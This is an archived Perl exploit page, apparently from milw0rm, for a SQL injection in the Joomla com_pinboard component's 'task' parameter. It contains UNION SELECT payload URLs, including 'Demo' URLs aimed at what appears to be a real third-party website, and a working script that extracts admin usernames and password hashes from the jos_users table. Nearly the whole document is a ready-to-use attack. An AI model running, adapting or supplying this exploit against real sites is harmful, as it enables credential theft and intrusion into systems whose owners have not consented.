<html><head><title>Joomla Component com_pinboard (task) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
# Joomla Component (com_pinboard) Remote SQL Injection
########################################
#[*] By : Stack
#POc
#http://site/index.php?option=com_pinboard&amp;Itemid=35&amp;action=showpic&amp;task=-48%20union%20select%201,2,3,4,5,6,username,8,9,10%20from%20jos_users--
#http://site/index.php?option=com_pinboard&amp;Itemid=35&amp;action=showpic&amp;task=-48%20union%20select%201,2,3,4,5,6,password,8,9,10%20from%20jos_users--
#Demo
#http://munimartin.at/index.php?option=com_pinboard&amp;Itemid=35&amp;action=showpic&amp;task=-48%20union%20select%201,2,3,4,5,6,username,8,9,10%20from%20jos_users--
#http://munimartin.at/index.php?option=com_pinboard&amp;Itemid=35&amp;action=showpic&amp;task=-48%20union%20select%201,2,3,4,5,6,password,8,9,10%20from%20jos_users--
########################################
system(&quot;color 02&quot;);
print &quot;\t\t############################################################\n\n&quot;;
print &quot;\t\t#       Joomla Component (com_pinboard) Remote SQL Injection    #\n\n&quot;;
print &quot;\t\t#                             by Stack                        #\n\n&quot;;
print &quot;\t\t############################################################\n\n&quot;;
use LWP::UserAgent;
die &quot;Example: perl $0 http://victim.com/path/\n&quot; unless @ARGV;
system(&quot;color f&quot;);
$user=&quot;username&quot;;
$pass=&quot;password&quot;;
$tab=&quot;jos_users&quot;;
$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $ARGV[0] . &quot;/index.php?option=com_pinboard&amp;Itemid=35&amp;action=showpic&amp;task=-48+union+select+1,2,3,4,5,6,concat(CHAR(60,117,115,101,114,62),&quot;.$user.&quot;,CHAR(60,117,115,101,114,62),CHAR(60,112,97,115,115,62),&quot;.$pass.&quot;,CHAR(60,112,97,115,115,62)),8,9,10+from+&quot;.$tab.&quot;--&quot;;
$res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
$answer = $res-&gt;content;
if ($answer =~ /&lt;user&gt;(.*?)&lt;user&gt;/){
        print &quot;\nBrought to you by v4-team.com...\n&quot;;
        print &quot;\n[+] Admin User : $1&quot;;
}
if ($answer =~/&lt;pass&gt;(.*?)&lt;pass&gt;/){print &quot;\n[+] Admin Hash : $1\n\n&quot;;
print &quot;\t\t#   Exploit has ben aported user and password hash   #\n\n&quot;;}
else{print &quot;\n[-] Exploit Failed...\n&quot;;}

# milw0rm.com [2009-06-25]</pre></html>